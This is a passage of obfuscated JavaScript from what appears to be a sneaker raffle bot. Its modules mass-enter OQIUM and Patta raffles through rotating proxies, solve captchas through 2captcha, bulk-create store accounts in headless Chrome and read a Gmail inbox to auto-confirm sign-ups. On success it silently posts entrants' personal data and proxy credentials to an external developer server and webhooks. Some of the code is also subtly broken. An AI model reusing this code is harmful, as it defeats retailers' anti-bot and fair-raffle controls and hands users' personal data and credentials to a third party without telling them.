                            !_0xa9dff2 && (_0xa9dff2 = {});
                            if (_0x138226 != 'ver') {
                                _0x1e0e73(_0x1c5fd5['name'] + '\x20Task\x20' + (_0x357ce8 + 0x1) + '\x20/\x20' + _0xa9dff2['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1), _0x5ec3d4 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x5e8391
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0xa9dff2[_0x357ce8]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x35ea91['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x4d5366
                                        }
                                    ]
                                }], _0x2e7727 = { 'embeds': _0x5ec3d4 }, _0xc9baf2 = _0x1c5fd5['data'], _0xc9baf2['data']['attributes']['email'] = '' + _0xa9dff2[_0x357ce8]['Email'];
                                if (_0xa9dff2[_0x357ce8]['Size'] == 'RANDOM') {
                                }
                                _0xc9baf2['data']['attributes']['properties']['$first_name'] = '' + _0xa9dff2[_0x357ce8]['FirstName'], _0xc9baf2['data']['attributes']['properties']['$last_name'] = '' + _0xa9dff2[_0x357ce8]['LastName'], _0xc9baf2['data']['attributes']['properties']['$address1'] = _0xa9dff2[_0x357ce8]['Address1'] + '\x20' + _0xa9dff2[_0x357ce8]['Address2'] + '\x20' + _0xa9dff2[_0x357ce8]['HouseNumber'], _0xc9baf2['data']['attributes']['properties']['$zip'] = '' + _0xa9dff2[_0x357ce8]['Zip'], _0xc9baf2['data']['attributes']['properties']['$city'] = '' + _0xa9dff2[_0x357ce8]['City'], _0xc9baf2['data']['attributes']['properties']['$country'] = '' + _0xa9dff2[_0x357ce8]['Country'], _0xa9dff2[_0x357ce8]['Size'] == 'RANDOM' ? _0xc9baf2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x34c44f[_0x56b178] : _0xc9baf2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xa9dff2[_0x357ce8]['Size'], _0xc9baf2['data']['attributes']['properties']['$phone_number'] = '' + _0xa9dff2[_0x357ce8]['Phone'], _0xc9baf2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xa9dff2[_0x357ce8]['Follower'];
                            }
                            if (_0x35ea91['useRandomProxy'] = ![])
                                var _0x3706ad = _0x482561[_0x357ce8]['split'](':');
                            else
                                var _0x2b63db = Math['round'](Math['random']() * (_0x482561['length'] - 0x1)), _0x3706ad = _0x482561[_0x2b63db]['split'](':');
                            var _0xfc3086 = {
                                'jar': _0x3bb051,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x1c5fd5['url'],
                                'headers': _0x1c5fd5['headers'],
                                'body': JSON['stringify'](_0xc9baf2),
                                'proxy': 'http://' + _0x3706ad[0x2] + ':' + _0x3706ad[0x3] + '@' + _0x3706ad[0x0] + ':' + _0x3706ad[0x1]
                            };
                            return _0x138226 != 'ver' && (_0xfc3086['url'] = _0x1c5fd5['url'], _0xfc3086['headers'] = _0x1c5fd5['headers']), _0x138226 == 'ver' && (_0xfc3086['method'] = 'GET'), new Promise(function (_0x4a8dd5, _0x14e30d) {
                                callback = async (_0x3dca4b, _0x395231, _0x5b81aa) => {
                                    if (!_0x3dca4b && _0x395231['statusCode'] == 0xca || !_0x3dca4b && _0x395231['statusCode'] == 0xc8) {
                                        if (_0x138226 != 'ver') {
                                            var _0x2b7bf9 = await _0x39e876(_0xa9dff2[_0x357ce8], _0x1c5fd5, 'dev', ![]), _0x431004 = await _0x39e876(_0xa9dff2[_0x357ce8], _0x1c5fd5, 'pub', ![]);
                                            const _0x565a2b = {
                                                'succesDEVMSG': { 'embeds': [_0x2b7bf9] },
                                                'succesPUBMSG': { 'embeds': [_0x431004] }
                                            };
                                            let _0x500d71 = _0xa9dff2[_0x357ce8];
                                            try {
                                                prxdata = {
                                                    'username': _0x5e8391['replace']('#', ''),
                                                    'module': _0x1c5fd5['name'],
                                                    'entrydata': JSON['stringify'](_0x500d71),
                                                    'proxy': '' + _0x482561[_0x357ce8]
                                                };
                                                var _0xace597 = JSON['stringify'](prxdata);
                                                let _0xa09dae = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0xace597, _0xa09dae);
                                            } catch (_0xd993e1) {
                                            }
                                            if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                                try {
                                                    await _0x19fe15(_0x35ea91['webhook'], _0x565a2b['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x565a2b['succesDEVMSG']), await _0x4d70b1(0xc8);
                                            try {
                                                await _0x19fe15(_0x44bee6, _0x565a2b['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5155d2(_0xa9dff2[_0x357ce8], _0x1c5fd5);
                                        }
                                        _0x4a8dd5(console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x1c5fd5['name'] + ']\x20Task\x20' + (_0x357ce8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x138226 != 'ver') {
                                            var _0x520e19 = '' + _0x3dca4b, _0x543089 = await _0x39e876(_0xa9dff2[_0x357ce8], _0x1c5fd5, 'dev', !![], _0x520e19), _0x3a2ec3 = {};
                                            _0x3a2ec3['errorDEV'] = { 'embeds': [_0x543089] }, _0x5415a4(_0xa9dff2[_0x357ce8], _0x1c5fd5), _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x3a2ec3['errorDEV']), await _0x19fe15(_0x556085, _0x3a2ec3['errorDEV']);
                                        }
                                        _0x14e30d(console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x1c5fd5['name'] + ']\x20Task\x20' + (_0x357ce8 + 0x1) + ':\x20' + _0x3dca4b)));
                                    }
                                };
                                try {
                                    _0x138226 != 'ver' && console['log'](_0x446ef5() + '\x20[' + _0x1c5fd5['name'] + ']\x20Task\x20' + (_0x357ce8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xc9baf2['data']['attributes']['email']), _0x2b1433(_0xfc3086, callback);
                                } catch (_0x534c24) {
                                    console['log'](_0x446ef5() + '\x20Task\x20' + (_0x357ce8 + 0x1) + ':\x20' + _0x534c24);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x120ded(_0x112e75, 'nor', _0x5d732f, _0x157d3e, _0x5113e1), console['log'](_0x446ef5() + '\x20[' + _0x5d732f['name'] + ']\x20Sleeping\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        } catch (_0x2085c6) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x7a4ae9, _0x54fabd, _0xc59adc) {
                    var _0x54fabd = [], _0x71dd8a = ![];
                    async function _0x5d5dc6() {
                        var _0x4b72cc = new _0x54e3bb({
                            'user': _0x35ea91['masterMail'],
                            'password': _0x35ea91['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x986a36(_0x5a847a) {
                            _0x4b72cc['openBox']('INBOX', ![], _0x5a847a);
                        }
                        _0x4b72cc['once']('ready', function () {
                            _0x986a36(function (_0x3d879d, _0x1390ec) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3d879d)
                                    throw _0x3d879d;
                                _0x4b72cc['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x382563, _0x502a6a) {
                                    if (!_0x502a6a || !_0x502a6a['length'])
                                        console['log'](_0x446ef5() + '\x20[' + _0x7a4ae9['name'] + ']\x20No\x20mails\x20found'), _0x4b72cc['end']();
                                    else {
                                        var _0xa1694 = _0x4b72cc['seq']['fetch'](_0x502a6a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xa1694['on']('message', function (_0x3bb362, _0x5401f0) {
                                            var _0x1958ca = '(#' + _0x5401f0 + ')\x20';
                                            _0x3bb362['on']('body', function (_0x58c5f8, _0xcb182f) {
                                                _0x2fc4a3(_0x58c5f8, (_0x2e4166, _0x3cc4aa) => {
                                                    var _0x231b83 = _0x3cc4aa['text']['split']('(')[0x1], _0x39247e = _0x231b83['split'](')')[0x0];
                                                    _0x54fabd['push'](_0x39247e);
                                                });
                                            }), _0x3bb362['once']('end', function () {
                                            });
                                        }), _0xa1694['once']('error', function (_0x2068ee) {
                                            console['log']('Fetch\x20error:\x20' + _0x2068ee), _0x71dd8a = !![];
                                        }), _0xa1694['once']('end', function () {
                                            _0x4b72cc['end'](), _0x71dd8a = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x4b72cc['once']('error', function (_0x42c1e6) {
                            console['log'](_0x42c1e6), _0x71dd8a = !![];
                        }), _0x4b72cc['once']('end', async function () {
                            _0x71dd8a = !![];
                        }), _0x4b72cc['connect']();
                    }
                    async function _0xde14d6(_0x20beca, _0x495ea5, _0x44ed45) {
                        for (var _0x4ee3e9 = 0x0; _0x4ee3e9 < _0x495ea5['length']; _0x4ee3e9++) {
                            async function _0x58ff85(_0x12ec4c, _0x42e9b9, _0x33450b, _0x13011c, _0x2e6cc7) {
                                var _0x3ae1dc, _0x37a396 = {}, _0x2ed75f = [], _0x153537 = {}, _0x4e891c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x528931 = Math['round'](Math['random']() * (_0x4e891c['length'] - 0x1));
                                _0x13011c[_0x12ec4c]['Size'] == 'RANDOM' && (_0x13011c[_0x12ec4c]['Size'] = _0x4e891c[_0x528931]);
                                !_0x13011c && (_0x13011c = {});
                                if (_0x35ea91['useRandomProxy'] = ![])
                                    var _0x77b1ba = _0x2e6cc7[_0x12ec4c]['split'](':');
                                else
                                    var _0x18b746 = Math['round'](Math['random']() * (_0x2e6cc7['length'] - 0x1)), _0x77b1ba = _0x2e6cc7[_0x18b746]['split'](':');
                                var _0x212582 = {
                                    'jar': _0x3bb051,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x33450b['url'],
                                    'headers': _0x33450b['headers'],
                                    'body': JSON['stringify'](_0x37a396),
                                    'proxy': 'http://' + _0x77b1ba[0x2] + ':' + _0x77b1ba[0x3] + '@' + _0x77b1ba[0x0] + ':' + _0x77b1ba[0x1]
                                };
                                return _0x42e9b9 != 'ver' && (_0x212582['url'] = _0x33450b['url'], _0x212582['headers'] = _0x33450b['headers']), _0x42e9b9 == 'ver' && (_0x212582['method'] = 'GET', _0x212582['url'] = _0x13011c[_0x12ec4c]), new Promise(function (_0x1dc46b, _0x1b86c5) {
                                    callback = async (_0x51eabd, _0x497d66, _0x5c0f73) => {
                                        if (!_0x51eabd && _0x497d66['statusCode'] == 0xca || !_0x51eabd && _0x497d66['statusCode'] == 0xc8) {
                                            if (_0x42e9b9 != 'ver') {
                                                var _0x41ec85 = await _0x39e876(_0x13011c[_0x12ec4c], _0x33450b, 'dev', ![]), _0x1a32b3 = await _0x39e876(_0x13011c[_0x12ec4c], _0x33450b, 'pub', ![]);
                                                const _0x3f3735 = {
                                                    'succesDEVMSG': { 'embeds': [_0x41ec85] },
                                                    'succesPUBMSG': { 'embeds': [_0x1a32b3] }
                                                };
                                                if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                                    try {
                                                        await _0x19fe15(_0x35ea91['webhook'], _0x3f3735['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x3f3735['succesDEVMSG']), await _0x4d70b1(0xc8);
                                                try {
                                                    await _0x19fe15(_0x44bee6, _0x3f3735['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5155d2(_0x13011c[_0x12ec4c], _0x33450b);
                                            }
                                            _0x1dc46b(console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x33450b['name'] + ']\x20Task\x20' + (_0x12ec4c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x42e9b9 != 'ver') {
                                                var _0x41929e = '' + _0x51eabd, _0x2e3064 = await _0x39e876(_0x13011c[_0x12ec4c], _0x33450b, 'dev', !![], _0x41929e), _0x7e60dd = {};
                                                _0x7e60dd['errorDEV'] = { 'embeds': [_0x2e3064] }, _0x5415a4(_0x13011c[_0x12ec4c], _0x33450b), _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x7e60dd['errorDEV']), await _0x19fe15(_0x556085, _0x7e60dd['errorDEV']);
                                            }
                                            _0x1b86c5(console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x33450b['name'] + ']\x20Task\x20' + (_0x12ec4c + 0x1) + ':\x20' + _0x51eabd)));
                                        }
                                    };
                                    try {
                                        _0x42e9b9 != 'ver' ? console['log'](_0x446ef5() + '\x20[' + _0x33450b['name'] + ']\x20Task\x20' + (_0x12ec4c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x37a396['data']['attributes']['email']) : console['log'](_0x446ef5() + '\x20[' + _0x33450b['name'] + ']\x20Task\x20' + (_0x12ec4c + 0x1) + ':\x20Fetching\x20Response'), _0x2b1433(_0x212582, callback);
                                    } catch (_0x4a7e29) {
                                        console['log'](_0x446ef5() + '\x20Task\x20' + (_0x12ec4c + 0x1) + ':\x20' + _0x4a7e29);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x58ff85(_0x4ee3e9, 'ver', _0x20beca, _0x495ea5, _0x44ed45), console['log'](_0x446ef5() + '\x20[' + _0x20beca['name'] + ']\x20Sleeping\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                            } catch (_0x32bab8) {
                            }
                        }
                    }
                    try {
                        _0x5d5dc6();
                        while (!_0x71dd8a) {
                            await _0x4d70b1(0xfa0);
                        }
                        console['log']('Found\x20' + _0x54fabd['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0xde14d6(_0x7a4ae9, _0x54fabd, _0xc59adc);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4cf73c, _0x285b2a, _0x2cfcfd) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5223ac = 0x0; _0x5223ac < _0x285b2a['length']; _0x5223ac++) {
                        var _0x346921 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5e8391
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x35ea91['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4d5366
                                }
                            ]
                        }];
                        const _0x2b681a = { 'embeds': _0x346921 };
                        _0x1e0e73(_0x4cf73c['name'] + '\x20Task\x20' + (_0x5223ac + 0x1) + '\x20/\x20' + _0x285b2a['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        try {
                            await _0x408b94(_0x285b2a, _0x5223ac);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x120b5b = await _0x39e876(_0x285b2a[_0x5223ac], _0x4cf73c, 'acc', ![]);
                        const _0x1a0e5a = { 'succesDEVMSG': { 'embeds': [_0x120b5b] } };
                        if (_0x285b2a[_0x5223ac]['Email'] == '' || _0x285b2a[_0x5223ac]['FirstName'] == '' || _0x285b2a[_0x5223ac]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4d70b1(0x7d0);
                            continue;
                        }
                        (_0x285b2a[_0x5223ac]['Password'] == '' || _0x285b2a[_0x5223ac] == undefined) && _0x285b2a[_0x5223ac]['Password'] == 'JRaffles23!';
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x4e1f6d = _0x2cfcfd[_0x5223ac]['split'](':');
                        else
                            var _0xef192 = Math['round'](Math['random']() * (_0x2cfcfd['length'] - 0x1)), _0x4e1f6d = _0x2cfcfd[_0xef192]['split'](':');
                        var _0xc763a3;
                        try {
                            _0xc763a3 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e1f6d[0x0] + ':' + _0x4e1f6d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc763a3 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e1f6d[0x0] + ':' + _0x4e1f6d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x332759 = await _0xc763a3['newPage']();
                            await _0x332759['authenticate']({
                                'username': '' + _0x4e1f6d[0x2],
                                'password': '' + _0x4e1f6d[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x4cf73c['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Getting\x20Session'), await _0x332759['setRequestInterception'](!![]), _0x332759['on']('request', _0x39fc17 => {
                                _0x39fc17['resourceType']() === 'image' || _0x39fc17['resourceType']() === 'font' || _0x39fc17['resourceType']() === 'media' ? _0x39fc17['abort']() : _0x39fc17['continue']();
                            }), await _0x332759['goto']('https://patta.nl/account/register'), await _0x4d70b1(0xbb8), await _0x332759['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x446ef5() + '\x20[' + _0x4cf73c['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Filling\x20information'), await _0x332759['type']('#RegisterForm-FirstName', '' + _0x285b2a[_0x5223ac]['FirstName']), await _0x4d70b1(0x226), await _0x332759['type']('#RegisterForm-LastName', '' + _0x285b2a[_0x5223ac]['LastName']), await _0x4d70b1(0x226), await _0x332759['type']('#RegisterForm-email', '' + _0x285b2a[_0x5223ac]['Email']), await _0x4d70b1(0x226), await _0x332759['type']('#RegisterForm-password', '' + _0x285b2a[_0x5223ac]['Password']), await _0x4d70b1(0x226), console['log'](_0x446ef5() + '\x20[' + _0x4cf73c['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Submitting..'), await _0x332759['$eval']('#RegisterForm', _0x4379c6 => _0x4379c6['submit']()), await _0x4d70b1(0x1f40);
                            try {
                                await _0x332759['waitForSelector']('.home-page-grid__collection'), await _0x4d70b1(0x1f4), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x4cf73c['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Account\x20' + _0x285b2a[_0x5223ac]['Email'] + '\x20Generated!')), _0xf25b74['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x285b2a[_0x5223ac]['Email'] + ',' + _0x285b2a[_0x5223ac]['Password']), console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x4cf73c['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Account\x20' + _0x285b2a[_0x5223ac]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x1a0e5a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x19fe15(_0x55ae18, _0x1a0e5a['succesDEVMSG']);
                            } catch (_0x374c3a) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x374c3a));
                            }
                        } catch (_0x20db48) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x5223ac + 0x1) + '\x20:\x20' + _0x20db48));
                        } finally {
                            _0xc763a3 && _0xc763a3['close'](), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2336db, _0x20412c, _0x1d9476) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc86249 = 0x0; _0xc86249 < _0x20412c['length']; _0xc86249++) {
                        var _0x3ac86b;
                        if (_0x4c5fc7 != 'yes')
                            var _0x4c5fc7 = '', _0x3dccda = 0x0;
                        _0x1e0e73(_0x2336db['name'] + '\x20Task\x20' + (_0xc86249 + 0x1) + '\x20/\x20' + _0x20412c['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        try {
                            await _0x408b94(_0x20412c, _0xc86249);
                        } catch {
                            _0x4c5fc7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x20412c[_0xc86249]['Email'] == '' || _0x20412c[_0xc86249]['Password'] == '' || _0x20412c[_0xc86249]['FirstName'] == '' || _0x20412c[_0xc86249]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x13a585 = _0x1d9476[_0xc86249]['split'](':');
                        else
                            var _0x4dd961 = Math['round'](Math['random']() * (_0x1d9476['length'] - 0x1)), _0x13a585 = _0x1d9476[_0x4dd961]['split'](':');
                        var _0xa3021c;
                        try {
                            _0xa3021c = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13a585[0x0] + ':' + _0x13a585[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xa3021c = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x13a585[0x0] + ':' + _0x13a585[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xdbcf4a = await _0xa3021c['newPage']();
                            await _0xdbcf4a['authenticate']({
                                'username': '' + _0x13a585[0x2],
                                'password': '' + _0x13a585[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xdbcf4a['setRequestInterception'](!![]), _0xdbcf4a['on']('request', _0x157e48 => {
                                _0x157e48['resourceType']() === 'image' || _0x157e48['resourceType']() === 'font' || _0x157e48['resourceType']() === 'media' ? _0x157e48['abort']() : _0x157e48['continue']();
                            }), await _0xdbcf4a['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xdbcf4a['waitForSelector']('#CustomerEmail'), console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Logging\x20in..'), await _0xdbcf4a['type']('#CustomerEmail', '' + _0x20412c[_0xc86249]['Email']), await _0x4d70b1(0x12c), await _0xdbcf4a['type']('#CustomerPassword', '' + _0x20412c[_0xc86249]['Password']), await _0x4d70b1(0x226), await _0xdbcf4a['$eval']('#customer_login', _0x241b21 => _0x241b21['submit']());
                            try {
                                await _0xdbcf4a['waitForSelector']('#orders'), await _0x4d70b1(0x4b0);
                            } catch {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xdbcf4a['goto']('' + _0x20412c[_0xc86249]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4d70b1(0xbb8), console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xdbcf4a['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xdbcf4a['type']('#email', '' + _0x20412c[_0xc86249]['Email']), await _0x4d70b1(0x384), await _0xdbcf4a['type']('#first_name', '' + _0x20412c[_0xc86249]['FirstName']), await _0x4d70b1(0x514), await _0xdbcf4a['type']('#last_name', '' + _0x20412c[_0xc86249]['LastName']), await _0x4d70b1(0x514), await _0xdbcf4a['type']('#street_address', _0x20412c[_0xc86249]['Address1'] + '\x20' + _0x20412c[_0xc86249]['HouseNumber'] + '\x20' + _0x20412c[_0xc86249]['Address2']), await _0x4d70b1(0x2bc);
                            _0x20412c[_0xc86249]['Postcode'] == undefined && (_0x20412c[_0xc86249]['Postcode'] = _0x20412c[_0xc86249]['Zip']);
                            await _0xdbcf4a['type']('#zip_code', '' + _0x20412c[_0xc86249]['Postcode']), await _0x4d70b1(0x320), await _0xdbcf4a['type']('#city', '' + _0x20412c[_0xc86249]['City']), await _0x4d70b1(0x320), await _0xdbcf4a['type']('#bday', '01/01/1994'), await _0x4d70b1(0x320), await _0xdbcf4a['type']('#instagram', '' + _0x20412c[_0xc86249]['Follower']), await _0x4d70b1(0x352);
                            if (_0x20412c[_0xc86249]['Size'] == 'RANDOM') {
                                const _0x23c1c9 = await _0xdbcf4a['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x34f01c => {
                                    return _0x34f01c['map'](_0x1b6195 => _0x1b6195['textContent']);
                                });
                                var _0x3c563c = Math['round'](Math['random']() * (_0x23c1c9['length'] - 0x1));
